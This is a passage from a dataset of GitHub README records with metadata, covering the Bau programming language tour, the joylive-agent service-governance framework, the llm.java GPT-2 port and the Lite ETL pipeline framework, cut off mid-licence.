
    println('Hello World')

#### Assignment


#### Import, Functions

    import org.bau.Utils

    fun printTime()
        println(Utils.getNanoTime())
  
    printTime()

#### Random

    import org.bau.Utils

    println(Utils.random())

#### Math

    import org.bau.Math

    println('Pi: ' Math.PI)
    println(Math.sqrt(2))

##### Functions

    fun add(x int, y int) int
        return x + y

    println(add(42 1))

##### Data Types

    a := 10_000_000
    b := i8(110)
    c := i16(65000)
    d : 'text'
    e := 3.1416
    f := 0..10
    println(a ' ' b)

##### Type Conversion

    a := 10_000_000
    b := 3
    println(a / b)
    println(float(a) / b)
    
##### Constants

    PI : 3.1415
    println(PI)
    
##### For Loops

    sum := 0
    for i := range(0 10)
        sum += i
    println(sum)

##### While Loops

    sum := 1
    while sum < 10_000
        sum += sum
    println(sum)
    
##### If

    for i := range(1, 10)
        if i < 5
            println(i)

##### If Else

    for i := range(1, 10)
        if i < 5
            println(i)
        else
            println(-i)

##### If Elif Else

    for i := range(1, 10)
        if i = 0
            println('zero')
        elif i = 1
            println('one')
        elif i = 2
            println('two')
        else
            println('many')

##### Switch

    import org.bau.Utils

    for i := range(1, 10)
        switch Utils.random() & 7
        case 0
            println('zero')
        case 1
            println('one')
        case 2, 3
            println('2 or 3')
        else  
            println('other') 

##### Types

    type point
        x int
        y int
    
    p := new(point)
    p.x = 10
    p.y = 20
    
##### Arrays

    array : new(i8[], 10)
    for i := until(array.len)
        array[i] = i

##### List

    import org.bau.List
        List
        newList
    
    list := newList(int)
    list.add(100)
    list.add(80)
    println(list.size)
    println(list.array[0])

##### Enum

    enum weekday
        sunday
        monday
        tuesday
        wednesday
        thursday
        friday
        saturday

    for a := until(weekday.saturday + 1)
        switch a
        case weekday.sunday
            println('sunday')
        case weekday.monday
            println('monday')
        else
            println('some other day: #' a)

##### Macros and Ternary Condition

    fun if(cond int, a T, b T) macro T
        if cond
            return a
        else
            return b

    for i := until(3)
        println(i ':', if(i, '>0', 'zero'))

### Comparison

|Feature               |Bau    |Python |C      |C++    |Java   |C#     |Go     |Rust   |Swift  |
|----------------------|-------|-------|-------|-------|-------|-------|-------|-------|-------|
|Memory Safety         |&check;|&check;|       |       |&check;|&check;|&check;|&check;|&check;|
|Easy to Learn and Use |&check;|&check;|&check;|       |&check;|&check;|&check;|       |&check;|
|Concise Syntax        |&check;|&check;|       |       |       |       |       |       |       |
|Vendor Independent    |&check;|&check;|&check;|&check;|       |       |       |&check;|       |
|Strongly Typed        |&check;|       |&check;|&check;|&check;|&check;|&check;|&check;|&check;|
|Fast Execution        |&check;|       |&check;|&check;|&check;|&check;|&check;|&check;|&check;|
|No GC Pauses          |&check;|       |&check;|&check;|       |       |       |&check;|&check;|
|Runs Everywhere       |&check;|       |&check;|       |       |       |       |       |       |
|Generics / Templates  |&check;|       |       |&check;|&check;|&check;|&check;|&check;|&check;|
|Macros                |&check;|       |&check;|&check;|       |       |       |&check;|&check;|
|Exception Handling    |&check;|&check;|       |&check;|&check;|&check;|&check;|&check;|&check;|
|Null Safety           |&check;|       |       |       |       |&check;|       |&check;|&check;|
|Array Bounds Checks   |&check;|&check;|       |       |&check;|&check;|&check;|&check;|&check;|
|Compile-Time Execution|&check;|       |       |&check;|       |       |       |       |       |

### Non-Features

* Many concepts of object-oriented programming languages are not supported,
  for example inheritance, method overloading, polymorphism,
  and more complex encapsulation.
* Many concepts of functional programming languages are not supported, 
  for example high-order functions, functional composition,
  closures.
* Reflection is not supported.
* Tail calls are only optimized by the C compiler.
* Multi-threading support is limited to what C supports.
* Coroutines are not supported.
* `goto` and labels are not supported.
* String interpolation is not supported to simplify the language. 
  Instead, use an arrays of strings. As commas are optional, this is short.
* Dynamic dispatch is not supported.

### Syntax

* Spaces (indentation) is used to group statements. This reduces the number of lines.
  Tabs are not supported. The reason is that spaces are more common,
  and tabs do not mix well with spaces. By disallowing tabs, problems are detected early.
* Commas in parameter lists are optional, if parameters are simple values.
  The same as in shell scripts or Lisp.
  This also makes 'print' statements more readable (without string interpolation).
* There is no `boolean` data type to simplify the syntax. 
  Instead, `true` is `1` and `false` is `0`.
  The common pitfalls, e.g. comparing the result of a comparison,
  requires parenthesis (eg. `a > b < c` is not allowed).
* Constants and variables are defined in a different way (`:` vs `:=`)
  so that it's easier to see for a reader if it may change later.
  But there is no keyword like ""var"", ""val"", ""const"", or ""final"" to shorten the code.
* Definition of a variables is distinct from updating it (`:=` vs `=`) to quickly
  detect if a variable was already defined, and to detect typos.
* `break` and `continue` can have a condition, to avoid a separate line with `if`.
* Labels for `break` and `continue` are not supported to simplify the language.
  If needed, the function can return from inside the loop, or throw an exception
  (such exceptions are very fast).
* Comments are only a single character (`#`) to save some typing.
  Block comments (`##`) are useful if the editor doesn't support commenting a block.
  To support eg. Markdown inside of block comments, the delimiters can be variable length.
* Raw strings are useful, to avoid escaping problems: https://xkcd.com/1638/
* Multi-line strings are always raw strings, 
  as escape sequences don't seem useful for this (tabs are supported here).
* Dangling `,` are supported to e.g. simplify re-ordering entries.
* Bit operations `|`, `&`, `^`, `~` have a higher order of precedence than comparison.
  This is different from other programming languages.
  It seems the reason why it is different in other languages is historical reasons only.
* Instead of `&&` `||` `!` we use the keywords `and`, `or` and `not`, 
  to make these common cases easier to understand for new developers,
  and in case of `not` to make it easier to read.
* There are no separate unsigned data types, to simplify the language.
* Bitwise shift to the right (`>>`) is a logical shift, that means for negative values,
  a number of zeros are added to the left. The arithmetic shift is not supported
  by the language itself, but can be supported by a library function
  (same as eg. rotation). The reason is that logical shifts are more common.

### Safety 
* There is no way to write unsafe code, except by calling C methods.
* Array bounds are check, except if array access is guaranteed to be 
  inside the bounds. This is implemented using dependent types.
  
### Memory Management
* Reference counting is used for reference types.
* Mark-and-sweep garbage collection is not used to avoid pauses.
* Borrow checking is not used to simplify writing code.
* The plan is to use reference counting only where cycles are not possible.
* The plan is to support weak references.
* The plan is to support unique pointers, and arrays of pre-allocated objects 
  accessed via handlers and a generation

### Exceptions and Panic
* Exceptions need to be handled using `catch`, or re-thrown.
* There is no `try` keyword: `catch` will catch all exceptions in the same scope.
  This is to simplify the code, and reduce the need of indentation.
  Ruby supports a similar syntax: `begin` is not needed.
* Custom exception types are allowed, with some restrictions:
  Exception types need to have an integer field `exceptionType`
  that may not have a negative value (because internally, this field
  is used to to flag whether the method was successful or not,
  and a negative value is used to indicate success).
* Possible null references need to be handled. 
  There is no way that null references can throw an exception or panic.
* Integer division (`/`) by zero, the same as floating point division by zero,
  doesn't throw an exception. Instead, it returns the highest / lowest value
  (if dividing positive or negative numbers), or zero (for zero by zero).
  This is to be more consistent with the floating point division, and
  to avoid panic for cases were it was used for ""unimportant"" operations
  such as calculating the number of instructions per second, for zero seconds.
  The same goes for modulo operations.
",0,0,1,apache-2.0,1.0,"['bau', 'bau', 'simple', 'concise', 'safe', 'powerful', 'fast', 'programming', 'language', 'feature', 'easy', 'learn', 'concise', 'syntax', 'statically', 'typed', 'fast', 'compilation', 'execution', 'transpiles', 'c', 'try', 'browser', 'address', 'language', 'issue', 'memory', 'safety', 'c', 'hard', 'use', 'master', 'rust', 'vendor', 'java', 'swift', 'c', 'gc', 'pause', 'python', 'java', 'c', 'verbose', 'syntax', 'c', 'go', 'java', 'slow', 'execution', 'python', 'null', 'pointer', 'error', 'java', 'c', 'array', 'bound', 'check', 'java', 'rust', 'example', 'keywords', 'control', 'flow', 'assignment', 'comparison', 'operation', 'constant', 'variable', 'etc', 'update', 'bitwise', 'data', 'type', 'miscellaneous', 'comment', 'block', 'comment', 'constant', 'variables', 'identifier', 'contain', 'letter', 'digit', 'defines', 'constant', 'defines', 'variable', 'update', 'variable', 'without', 'value', 'requires', 'type', 'type', 'type', 'signed', 'integer', 'floating', 'point', 'restricted', 'range', 'using', 'default', 'bit', 'conversion', 'function', 'change', 'type', 'may', 'truncate', 'condition', 'start', 'condition', 'space', 'group', 'statement', 'block', 'else', 'optional', 'loop', 'loop', 'optional', 'argument', 'simple', 'internally', 'converted', 'exit', 'loop', 'may', 'condition', 'comment', 'start', 'line', 'comment', 'two', 'start', 'end', 'block', 'comment', 'comment', 'type', 'function', 'converted', 'documentation', 'literal', 'number', 'start', 'digit', 'ignored', 'floating', 'point', 'hexadecimal', 'string', 'starting', 'may', 'contain', 'newline', 'tab', 'single', 'quote', 'backslash', 'byte', 'used', 'raw', 'string', 'escape', 'start', 'end', 'one', 'one', 'begin', 'next', 'line', 'may', 'indented', 'operator', 'compare', 'two', 'value', 'return', 'inverse', 'comparison', 'combine', 'comparison', 'right', 'side', 'evaluated', 'needed', 'integer', 'wrap', 'around', 'underflow', 'integer', 'division', 'return', 'max', 'min', 'bitwise', 'xor', 'shift', 'right', 'logical', 'shift', 'right', 'leftmost', 'bit', 'become', 'function', 'start', 'function', 'may', 'value', 'mean', 'variable', 'number', 'argument', 'function', 'share', 'name', 'number', 'argument', 'different', 'declared', 'first', 'implemented', 'later', 'function', 'executed', 'compile', 'time', 'argument', 'constant', 'function', 'call', 'replaced', 'compile', 'time', 'implementation', 'type', 'passed', 'parameter', 'implicitly', 'internally', 'function', 'template', 'type', 'type', 'field', 'function', 'type', 'function', 'called', 'memory', 'freed', 'lowercase', 'type', 'copied', 'assigned', 'uppercase', 'type', 'referenced', 'function', 'type', 'allowed', 'type', 'parameter', 'null', 'mean', 'may', 'explicit', 'check', 'required', 'using', 'value', 'null', 'pointer', 'error', 'runtime', 'value', 'type', 'eg', 'ca', 'array', 'access', 'create', 'access', 'array', 'use', 'bound', 'checked', 'needed', 'access', 'without', 'runtime', 'check', 'require', 'compiler', 'verifies', 'correctness', 'index', 'variable', 'range', 'restriction', 'allow', 'code', 'use', 'ensure', 'runtime', 'check', 'done', 'conditional', 'guarantee', 'within', 'bound', 'exception', 'throw', 'exception', 'needed', 'method', 'need', 'custom', 'exception', 'type', 'allowed', 'module', 'import', 'allows', 'using', 'type', 'function', 'module', 'last', 'part', 'module', 'name', 'identifier', 'module', 'identifier', 'omitted', 'type', 'function', 'constant', 'listed', 'full', 'module', 'name', 'used', 'well', 'defines', 'module', 'name', 'need', 'match', 'file', 'path', 'tour', 'hello', 'world', 'assignment', 'import', 'function', 'random', 'math', 'function', 'data', 'type', 'type', 'conversion', 'constant', 'loop', 'loop', 'else', 'elif', 'else', 'switch', 'type', 'array', 'list', 'enum', 'macro', 'ternary', 'condition', 'comparison', 'safety', 'learn', 'use', 'syntax', 'independent', 'typed', 'execution', 'gc', 'pause', 'everywhere', 'template', 'handling', 'safety', 'bound', 'check', 'many', 'concept', 'programming', 'language', 'supported', 'example', 'inheritance', 'method', 'overloading', 'polymorphism', 'complex', 'encapsulation', 'many', 'concept', 'functional', 'programming', 'language', 'supported', 'example', 'function', 'functional', 'composition', 'closure', 'reflection', 'supported', 'tail', 'call', 'optimized', 'c', 'compiler', 'support', 'limited', 'c', 'support', 'coroutines', 'supported', 'label', 'supported', 'string', 'interpolation', 'supported', 'simplify', 'language', 'instead', 'use', 'array', 'string', 'comma', 'optional', 'short', 'dynamic', 'dispatch', 'supported', 'syntax', 'space', 'indentation', 'used', 'group', 'statement', 'reduces', 'number', 'line', 'tab', 'supported', 'reason', 'space', 'common', 'tab', 'mix', 'well', 'space', 'disallowing', 'tab', 'problem', 'detected', 'early', 'comma', 'parameter', 'list', 'optional', 'parameter', 'simple', 'value', 'shell', 'script', 'lisp', 'also', 'make', 'statement', 'readable', 'without', 'string', 'interpolation', 'data', 'type', 'simplify', 'syntax', 'instead', 'common', 'pitfall', 'comparing', 'result', 'comparison', 'requires', 'parenthesis', 'eg', 'allowed', 'constant', 'variable', 'defined', 'different', 'way', 'v', 'easier', 'see', 'reader', 'may', 'change', 'later', 'keyword', 'like', 'var', 'val', 'const', 'final', 'shorten', 'code', 'definition', 'variable', 'distinct', 'updating', 'v', 'quickly', 'detect', 'variable', 'already', 'defined', 'detect', 'typo', 'condition', 'avoid', 'separate', 'line', 'label', 'supported', 'simplify', 'language', 'needed', 'function', 'return', 'inside', 'loop', 'throw', 'exception', 'exception', 'fast', 'comment', 'single', 'character', 'save', 'typing', 'block', 'comment', 'useful', 'editor', 'support', 'commenting', 'block', 'support', 'eg', 'markdown', 'inside', 'block', 'comment', 'delimiters', 'variable', 'length', 'raw', 'string', 'useful', 'avoid', 'escaping', 'problem', 'http', 'string', 'always', 'raw', 'string', 'escape', 'sequence', 'seem', 'useful', 'tab', 'supported', 'dangling', 'supported', 'simplify', 'entry', 'bit', 'operation', 'higher', 'order', 'precedence', 'comparison', 'different', 'programming', 'language', 'seems', 'reason', 'different', 'language', 'historical', 'reason', 'instead', 'use', 'keywords', 'make', 'common', 'case', 'easier', 'understand', 'new', 'developer', 'case', 'make', 'easier', 'read', 'separate', 'unsigned', 'data', 'type', 'simplify', 'language', 'bitwise', 'shift', 'right', 'logical', 'shift', 'mean', 'negative', 'value', 'number', 'zero', 'added', 'left', 'arithmetic', 'shift', 'supported', 'language', 'supported', 'library', 'function', 'eg', 'rotation', 'reason', 'logical', 'shift', 'common', 'safety', 'way', 'write', 'unsafe', 'code', 'except', 'calling', 'c', 'method', 'array', 'bound', 'check', 'except', 'array', 'access', 'guaranteed', 'inside', 'bound', 'implemented', 'using', 'dependent', 'type', 'memory', 'management', 'reference', 'counting', 'used', 'reference', 'type', 'garbage', 'collection', 'used', 'avoid', 'pause', 'borrow', 'checking', 'used', 'simplify', 'writing', 'code', 'plan', 'use', 'reference', 'counting', 'cycle', 'possible', 'plan', 'support', 'weak', 'reference', 'plan', 'support', 'unique', 'pointer', 'array', 'object', 'accessed', 'via', 'handler', 'generation', 'exception', 'panic', 'exception', 'need', 'handled', 'using', 'keyword', 'catch', 'exception', 'scope', 'simplify', 'code', 'reduce', 'need', 'indentation', 'ruby', 'support', 'similar', 'syntax', 'needed', 'custom', 'exception', 'type', 'allowed', 'restriction', 'exception', 'type', 'need', 'integer', 'field', 'may', 'negative', 'value', 'internally', 'field', 'used', 'flag', 'whether', 'method', 'successful', 'negative', 'value', 'used', 'indicate', 'success', 'possible', 'null', 'reference', 'need', 'handled', 'way', 'null', 'reference', 'throw', 'exception', 'panic', 'integer', 'division', 'zero', 'floating', 'point', 'division', 'zero', 'throw', 'exception', 'instead', 'return', 'highest', 'lowest', 'value', 'dividing', 'positive', 'negative', 'number', 'zero', 'zero', 'zero', 'consistent', 'floating', 'point', 'division', 'avoid', 'panic', 'case', 'used', 'unimportant', 'operation', 'calculating', 'number', 'instruction', 'per', 'second', 'zero', 'second', 'go', 'modulo', 'operation']","['type', 'function', 'supported', 'exception', 'language']",3,0,0,"['bau', 'example', 'keywords', 'constant', 'variable', 'shortcut', 'type', 'condition', 'loop', 'loop', 'print', 'comment', 'line', 'comment', 'block', 'comment', 'literal', 'operator', 'function', 'type', 'null', 'may', 'return', 'null', 'array', 'access', 'exception', 'module', 'import', 'tour', 'hello', 'world', 'assignment', 'import', 'function', 'random', 'math', 'function', 'data', 'type', 'type', 'conversion', 'constant', 'for', 'loop', 'while', 'loop', 'if', 'if', 'else', 'if', 'elif', 'else', 'switch', 'type', 'array', 'list', 'enum', 'macro', 'ternary', 'condition', 'comparison', 'syntax', 'safety', 'memory', 'management', 'exception', 'panic']",50,"['type', 'loop', 'comment', 'function', 'if']",0,76.0,1.0,[],0.0,1.0,0.0,16486,17.441860465116278,4.472444444444444,"['i', 'i', 'i']",3
jd-opensource/joylive-agent,main,"# joylive-agent

[![Build](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml/badge.svg)](https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml)
![License](https://img.shields.io/github/license/jd-opensource/joylive-agent.svg)
[![Maven Central](https://img.shields.io/maven-central/v/com.jd.live/joylive-agent.svg?label=maven%20central)](https://search.maven.org/search?q=g:com.jd.live)
[![GitHub repo](https://img.shields.io/badge/GitHub-repo-blue)](https://github.com/jd-opensource/joylive-agent)
[![GitHub release](https://img.shields.io/github/release/jd-opensource/joylive-agent.svg)](https://github.com/jd-opensource/joylive-agent/releases)
[![Percentage of issues still open](http://isitmaintained.com/badge/open/jd-opensource/joylive-agent.svg)](http://isitmaintained.com/project/jd-opensource/joylive-agent ""Percentage of issues still open"")
[![Slack Status](https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&style=social)](https://joylivehq.slack.com)

<img src=""docs/image/weixin.png"" title=""The QR code is valid until 2024/7/8"" width=""150"" />

English | [简体中文](./README-zh.md)

## Overview

Service Governance Framework, supporting traditional microservice governance, swimlane governance, and multi-active (unit) traffic governance.
Following the traditional SDK governance model and Sidecar governance model, an exploration and implementation of the new generation Proxyless mode based on a microkernel extensible architecture, providing a high-performance, low-resource-consumption, cost-effective traffic governance framework for the enterprise Java ecosystem.

## Architecture
1. Agent for multi-live   
![pic](docs/image/architect-0.png)

2. Agent architect   
![pic](docs/image/architect-1.png)

3. Agent government theory   
![pic](docs/image/architect-2.png)

4. Agent for full chain gray release based on lane   
![pic](docs/image/architect-3.png)

5. Agent for local cell priority strategy   
![pic](docs/image/architect-4.png)

6. For more information, please refer to the [Architecture Manual](docs/architect.md).

## Related Projects

1. [joylive-injector](https://github.com/jd-opensource/joylive-injector), used for cloud-native scenario auto-injection of `joylive-agent`.

## How to use

### Requirements

Compile requirement: JDK 17+ and Maven 3.2.5+ 

Runtime requirement: JDK 8+

## Main Features

1. Supports traffic control for various models, including in-region multi-activity and cross-region multi-activity.
2. Support swimlane-based full-link gray scale, QPS and concurrent current limiting, label routing, load balancing and other microservice governance strategies;
3. Supports local cell priority and cross-cell fault-tolerance strategies.
4. Employs bytecode enhancement technology, which is non-intrusive to business code and minimally impacts business performance.
5. Adopts a microkernel architecture with strong class isolation, featuring an easy-to-use and simple extension and configuration system.

## Quick Start

View [Quick Start](./docs/quickstart.md)

## Configuration reference manual

View [Configuration Reference Manual](./docs/config.md)

## Usage Examples

View [Usage Examples](./docs/example.md)

## Q&A

View [Q&A](./docs/qa.md)

## Release History

View [Release History](./RELEASE.md)

## Roadmap

View [Roadmap](./docs/roadmap.md)
",8,17,8,apache-2.0,55.0,"['english', 'overview', 'service', 'governance', 'framework', 'supporting', 'traditional', 'microservice', 'governance', 'swimlane', 'governance', 'unit', 'traffic', 'governance', 'following', 'traditional', 'sdk', 'governance', 'model', 'sidecar', 'governance', 'model', 'exploration', 'implementation', 'new', 'generation', 'proxyless', 'mode', 'based', 'microkernel', 'extensible', 'architecture', 'providing', 'traffic', 'governance', 'framework', 'enterprise', 'java', 'ecosystem', 'architecture', 'agent', 'agent', 'architect', 'agent', 'government', 'theory', 'agent', 'full', 'chain', 'gray', 'release', 'based', 'lane', 'agent', 'local', 'cell', 'priority', 'strategy', 'information', 'please', 'refer', 'architecture', 'manual', 'related', 'project', 'used', 'scenario', 'use', 'requirements', 'compile', 'requirement', 'jdk', 'maven', 'runtime', 'requirement', 'jdk', 'main', 'feature', 'support', 'traffic', 'control', 'various', 'model', 'including', 'support', 'gray', 'scale', 'qps', 'concurrent', 'current', 'limiting', 'label', 'routing', 'load', 'balancing', 'microservice', 'governance', 'strategy', 'support', 'local', 'cell', 'priority', 'strategy', 'employ', 'bytecode', 'enhancement', 'technology', 'business', 'code', 'minimally', 'impact', 'business', 'performance', 'adopts', 'microkernel', 'architecture', 'strong', 'class', 'isolation', 'featuring', 'simple', 'extension', 'configuration', 'system', 'quick', 'start', 'view', 'quick', 'start', 'configuration', 'reference', 'manual', 'view', 'configuration', 'reference', 'manual', 'usage', 'example', 'view', 'usage', 'example', 'q', 'view', 'q', 'release', 'history', 'view', 'release', 'history', 'roadmap', 'view', 'roadmap']","['governance', 'view', 'agent', 'architecture', 'traffic']",3,0,0,"['overview', 'architecture', 'related', 'project', 'how', 'use', 'requirement', 'main', 'feature', 'quick', 'start', 'configuration', 'reference', 'manual', 'usage', 'example', 'q', 'a', 'release', 'history', 'roadmap']",13,"['overview', 'architecture', 'related', 'project', 'how']",0,23.0,131.0,"[com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:flatten-maven-plugin,org.codehaus.mojo:versions-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.xolstice.maven.plugins:protobuf-maven-plugin]",0.0,99.0,32.0,3359,14.606060606060606,5.3879668049792535,"['![Build -> https://github.com/jd-opensource/joylive-agent/actions/workflows/build.yml/badge.svg', 'License -> https://img.shields.io/github/license/jd-opensource/joylive-agent.svg', '![Maven Central -> https://img.shields.io/maven-central/v/com.jd.live/joylive-agent.svg?label=maven%20central', '![GitHub repo -> https://img.shields.io/badge/GitHub-repo-blue', '![GitHub release -> https://img.shields.io/github/release/jd-opensource/joylive-agent.svg', '![Percentage of issues still open -> http://isitmaintained.com/badge/open/jd-opensource/joylive-agent.svg', '![Slack Status -> https://img.shields.io/badge/slack-join_chat-white.svg?logo=slack&style=social', 'joylive-injector -> https://github.com/jd-opensource/joylive-injector']",8
harryjackson/llm.java,main,"# llm.java

Large Language Model (LLM) example in java i.e. GPT2. This is a port of 
the [Llm.c code that lives here](https://github.com/karpathy/llm.c) written 
by @[karpathy](https://github.com/karpathy) 

## Before Running ChatGPT2 in Java

Before attempting to run this some prep work needs to happen. If you check 
the [llm.c repository](https://github.com/karpathy/llm.c) these steps are very similar. 
The reason the same code is in this repository is because LLM.c is still a moving target.

I highly recommend running the original llm.c to see it work. It's wonderful.

```bash
python -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
python prepro_tinyshakespeare.py
python train_gpt2.py
```

### JVM Requirements

I used the GraalVM for this running version 21. If you're using sdkman.

```bash
sdk default java 21.0.2-graalce
```

I tested the following JVM version and they all seem to work. I have not investigated why some are slower than 
others.

1. Temurin: This ran at half the speed of Graal. I stopped it at step 10

```bash
sdk install java 21-tem
sdk use java 21-tem
```

2. Correto: This VM was also really slow compared to Graal. So I stopped it after step 10

```bash
sdk install java 21.0.3-amzn
sdk use java 21.0.3-amzn
```


## Running

Note the arguments passed to the JVM. Of particular note is ""-Djava.util.concurrent.ForkJoinPool.common.parallelism=10"", 
adjust this based on how many cores you have. The matrix multiplication methods are entirely CPU bound so adding more
threads than cores will just slow things down. 

```bash
mvn clean install;
java -jar -ea --add-modules jdk.incubator.vector --enable-preview -Xmx8g -Djava.util.concurrent.ForkJoinPool.common.parallelism=10 target/gpt2-1.0-SNAPSHOT.jar
```

## Performance

I've made no attempt to tune this for performance. The C version is still much faster than this version. There are 
some low-hanging fruit like parallelizing some of the loops. I made the matmul_forward and matmul_backward both 
parallel because it was painfully slow without it.
",0,0,3,mit,0.0,"['large', 'language', 'model', 'llm', 'example', 'java', 'port', 'code', 'life', 'written', 'karpathy', 'running', 'java', 'attempting', 'run', 'prep', 'work', 'need', 'happen', 'check', 'repository', 'step', 'similar', 'reason', 'code', 'repository', 'still', 'moving', 'target', 'highly', 'recommend', 'running', 'original', 'see', 'work', 'wonderful', 'jvm', 'requirements', 'used', 'graalvm', 'running', 'version', 'using', 'sdkman', 'tested', 'following', 'jvm', 'version', 'seem', 'work', 'investigated', 'slower', 'others', 'temurin', 'ran', 'half', 'speed', 'graal', 'stopped', 'step', 'correto', 'vm', 'also', 'really', 'slow', 'compared', 'graal', 'stopped', 'step', 'running', 'note', 'argument', 'passed', 'jvm', 'particular', 'note', 'adjust', 'based', 'many', 'core', 'matrix', 'multiplication', 'method', 'entirely', 'cpu', 'bound', 'adding', 'thread', 'core', 'slow', 'thing', 'performance', 'made', 'attempt', 'tune', 'performance', 'c', 'version', 'still', 'much', 'faster', 'version', 'fruit', 'like', 'parallelizing', 'loop', 'made', 'parallel', 'painfully', 'slow', 'without']","['running', 'version', 'work', 'step', 'jvm']",1,0,0,"['before', 'run', 'java', 'jvm', 'requirement', 'run', 'performance']",5,"['run', 'before', 'java', 'jvm', 'requirement']",5,5.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,2075,16.136363636363637,4.453521126760563,"['Llm.c code that lives here -> https://github.com/karpathy/llm.c', 'karpathy -> https://github.com/karpathy', 'llm.c repository -> https://github.com/karpathy/llm.c']",3
WolfLink-DevTeam/lite-etl,master,"# Lite ETL

![开源协议](https://img.shields.io/github/license/WolfLink-DevTeam/lite-etl?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/WolfLink-DevTeam/lite-etl?style=for-the-badge)
![Last Commit](https://img.shields.io/github/last-commit/WolfLink-DevTeam/lite-etl?style=for-the-badge)
[![Star History Chart](https://api.star-history.com/svg?repos=WolfLink-DevTeam/lite-etl&type=Date)](https://star-history.com/#WolfLink-DevTeam/lite-etl&Date)

Lite ETL 是一个用于大数据领域开发的通用 ETL 框架。采用管道式设计，并配合 PreProcessor、Data Reader、Data Transformer、Data Writer 等组件，提供了高效、现代化的数据处理能力。
## 特性
- 轻量化设计：Lite ETL 专注于提供轻量级的 ETL 解决方案，避免了冗余的复杂性，使得使用者能够快速上手并集成到现有项目中。
- 管道式处理：采用管道式设计，数据处理过程更加清晰、模块化，易于理解和维护。
- 客制化：用户可以基于该框架自行实现相关组件，以完成对管道的功能扩展。
- 高效性：JavaPipe 使用了现代化的算法和优化技术，确保在处理大规模数据时能够保持高效率。
- 现代化架构：基于 Java 17 开发，充分利用了 Java 17 中的新特性，保持了与时俱进的现代化架构。
## 组件介绍
![image](https://github.com/WolfLink-DevTeam/lite-etl/blob/master/img/Pipeline%20Architecture.png)
### Pre Processor
当订阅者从数据源获取到数据后，会优先将数据交给数据预处理器进行处理。
Lite ETL 默认提供了两种类型的数据预处理器：
- Data Splitter：将输入的文档按照一定规则拆分成若干个文档，以便于后续进行处理。
- Update Time Finder：更新时间查找者，指定一个能够获取到文档更新时间的规则，以便于在拉取数据时进行比对，差量更新。
### Subscriber
定义了从数据源获取数据的具体方式。
Lite ETL 默认提供了一种类型的数据订阅者：
- Polling Subscriber：按照一定的周期轮询订阅数据。
### Transformer
对数据进行详细处理或类型转换的组件，即为转换器。多个转换器按照特定顺序可组合为转换器组。按照组的规格应用至管道。
Lite ETL 默认提供了一种类型的转换器组：
- LLM Transformer Group：基于 LLM + Prompt 对数据进行处理，包含了 Data Formatter、Value Filter、Fuzzy Extractor、Final Verifier 四种转换器。
- Data Formatter：依据格式化字典，对输入数据进行规范化词典替换。
- Value Filter：判定数据对于特定领域的分析是否具有价值。
- Fuzzy Extractor：基于认知模型对数据进行模糊提取。
- Final Verifier：对数据进行最终校验，判断数据在转换过程中是否存在异常。
### Writer
对数据进行输出，用户可以自行定义多种类型的数据写入者，将数据以各种不同形式进行输出。
## 快速使用
```java
public class Example {
    public static void main(String[] args) {
        // 启用 LLM 模型能力
        ETLConfig.getInstance().enableLLM(
                ""base-url"",
                ""sk-xxxxxx"",
                ModelSource.OPEN_AI,
                ""gpt-3.5-turbo""
        );
        // 规范化字典(可选)
        FormatDictionary dictionary = new FormatDictionary();
        // 管道对象
        Pipeline pipeline = Pipeline.builder()
                // 数据源
                .source(new TestSource())
                // 数据订阅者
                .subscriber(new PollingSubscriber())
                // 转换器组，包含一系列预先实现并按顺序绑定的转换器
                .transformerGroup(new LLMTransformerGroup(dictionary))
                // 数据写入者
                .writer(new ConsoleWriter())
                // 创建管道
                .build();
        // 开通管道，开始持续处理数据
        pipeline.open();
        // 关闭管道，不再接收并处理新的数据
        pipeline.close();
    }
}
```
## 依赖信息
```xml
前往 https://www.jitpack.io/#WolfLink-DevTeam/lite-etl 查看最新版本
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://www.jitpack.io</url>
    </repository>
</repositories>
<dependencies>
    <dependency>
        <groupId>com.github.WolfLink-DevTeam</groupId>
        <artifactId>lite-etl</artifactId>
        <version>Tag</version>
    </dependency>
</dependencies>
```
## 贡献
欢迎贡献者加入 Lite ETL 项目的开发和改进。如果你有兴趣为项目贡献代码、提交 bug 报告、改进文档或提出新的功能请求，请按照以下步骤进行：

点击 Fork 按钮，将仓库复制到你的 GitHub 账户中，再将 Fork 的仓库克隆到本地。
```sh
git clone https://github.com/your-username/lite-etl.git
cd lite-etl
```
接下来为你的修改创建一个新的分支。
```sh
git checkout -b feature-branch
```
请在本地分支上进行代码修改、bug 修复或文档改进，并提交你的修改到本地分支。
```sh
git add .
git commit -m ""描述你的修改内容""
```
修改完成后将本地分支推送到你的 GitHub 仓库。
```sh
git push origin feature-branch
```
最后在 GitHub 上提交 Pull Request，请详细描述你的修改内容和目的。
在提交之前，请确保你的代码遵循项目的编码规范，并通过所有的测试。
## 许可证
Lite ETL 采用 MIT 许可证，详情请参阅以下内容：
```text
MIT License

Copyright (c) 2024 WolfLink-DevTeam

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
